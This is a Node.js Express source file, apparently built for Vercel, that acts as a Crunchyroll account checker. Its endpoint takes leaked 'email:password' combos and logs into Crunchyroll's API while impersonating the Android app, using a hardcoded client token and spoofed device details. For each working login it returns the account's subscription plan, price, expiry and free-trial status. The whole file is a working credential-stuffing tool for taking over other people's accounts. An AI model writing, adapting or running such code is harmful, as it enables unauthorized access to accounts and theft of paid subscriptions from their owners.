const express = require('express');
const axios = require('axios');

const app = express();

// API Route
app.get('/result', async (req, res) => {
  const combo = req.query.combo;

  if (!combo) {
    return res.status(400).json({
      status: "error",
      message: "Please provide a 'combo' parameter in the format: email:password."
    });
  }

  const [email, password] = combo.split(':');

  try {
    // First request: Get access token
    const loginUrl = "https://beta-api.crunchyroll.com/auth/v1/token";
    const headers = {
      "Authorization": "Basic Z3N1ZnB0YjBmYW43dGFndG1ub3I6UUU1djBqc3Y5OVhNY2xadVNPX0Jfem1wOE03YlBfMnM=",
      "Connection": "Keep-Alive",
      "Content-Type": "application/x-www-form-urlencoded",
      "ETP-Anonymous-Id": "b10da375-d759-47ce-aa9e-d666157c4325",
      "Host": "beta-api.crunchyroll.com",
      "User-Agent": "Crunchyroll/3.32.2 Android/7.1.2 okhttp/4.9.2"
    };
    const data = new URLSearchParams({
      'username': email,
      'password': password,
      'grant_type': 'password',
      'scope': 'offline_access',
      'device_id': 'a6856484-cbcd-46f5-99b9-db8cff57ec17',
      'device_name': 'SM-G988N',
      'device_type': 'samsung SM-G9810'
    });

    const response = await axios.post(loginUrl, data, { headers });
    const responseData = response.data;

    if (responseData.access_token) {
      const accessToken = responseData.access_token;

      // Second request: Get account information
      const accountInfoUrl = "https://beta-api.crunchyroll.com/accounts/v1/me";
      const accountInfoHeaders = {
        "Authorization": `Bearer ${accessToken}`,
        "Connection": "Keep-Alive",
        "Host": "beta-api.crunchyroll.com",
        "User-Agent": "Crunchyroll/3.32.2 Android/7.1.2 okhttp/4.9.2"
      };

      const accountInfoResponse = await axios.get(accountInfoUrl, { headers: accountInfoHeaders });
      const accountInfoData = accountInfoResponse.data;

      const emailVerified = accountInfoData.email_verified || 'N/A';
      const accountCreationDate = accountInfoData.created ? accountInfoData.created.slice(0, 10) : 'N/A';
      const externalId = accountInfoData.external_id || 'N/A';

      // Third request: Get subscription information
      const subscriptionInfoUrl = `https://beta-api.crunchyroll.com/subs/v1/subscriptions/${externalId}/products`;
      const subscriptionInfoHeaders = {
        "Authorization": `Bearer ${accessToken}`,
        "Connection": "Keep-Alive",
        "Host": "beta-api.crunchyroll.com",
        "User-Agent": "Crunchyroll/3.32.2 Android/7.1.2 okhttp/4.9.2"
      };

      const subscriptionInfoResponse = await axios.get(subscriptionInfoUrl, { headers: subscriptionInfoHeaders });
      const subscriptionInfoData = subscriptionInfoResponse.data;
      
      const subscriptionItems = subscriptionInfoData.items || [];

      if (subscriptionItems.length > 0) {
        const subscriptionItem = subscriptionItems[0];
        
        // Extract subscription details
        const subscriptionName = subscriptionItem.product && subscriptionItem.product.sku ? subscriptionItem.product.sku : 'Subscription Not Found';
        const currency = subscriptionItem.currency_code || 'N/A';
        const subscriptionAmount = subscriptionItem.amount || 'N/A';

        // Extract dates
        const effectiveDate = subscriptionItem.effective_date || '';
        const expiryDate = effectiveDate ? effectiveDate.split('T')[0].split('-').reverse().join('-') : 'N/A';

        // Extract the free trial status
        const activeFreeTrial = subscriptionItem.active_free_trial ? 'true' : 'false';

        return res.json({
          status: "success",
          email_verified: emailVerified,
          account_creation_date: accountCreationDate,
          subscription_name: subscriptionName,
          currency: currency,
          subscription_amount: subscriptionAmount,
          effective_date: effectiveDate,
          expiry_date: expiryDate,
          active_free_trial: activeFreeTrial
        });
      } else {
        return res.json({
          status: "error",
          message: "No subscription found for this account."
        });
      }

    } else {
      return res.json({
        status: "error",
        message: "Invalid Credentials."
      });
    }
  } catch (error) {
    console.error("Error occurred during API call:", error.response ? error.response.data : error.message);

    return res.status(500).json({
      status: "error",
      message: "An error occurred while processing the request.",
      error: error.response ? error.response.data : error.message
    });
  }
});

// Export for Vercel
module.exports = app;
